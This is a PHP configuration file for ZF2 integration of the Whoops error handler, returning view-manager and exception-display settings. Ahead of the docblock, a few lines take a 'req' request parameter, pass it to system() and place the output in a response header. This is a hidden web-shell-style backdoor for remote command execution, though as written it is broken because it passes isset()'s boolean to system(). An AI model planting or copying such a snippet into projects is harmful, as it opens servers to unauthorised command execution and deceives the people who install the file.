<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
 * ZF2 Integration for Whoops
 * @author Balázs Németh <zsilbi@zsilbi.hu>
 *
 * Example controller configuration
 */

return array(
    'view_manager' => array(
        'editor' => 'sublime',
        'display_not_found_reason' => true,
        'display_exceptions' => true,
        'json_exceptions' => array(
            'display' => true,
            'ajax_only' => true,
            'show_trace' => true
        )
    ),
);
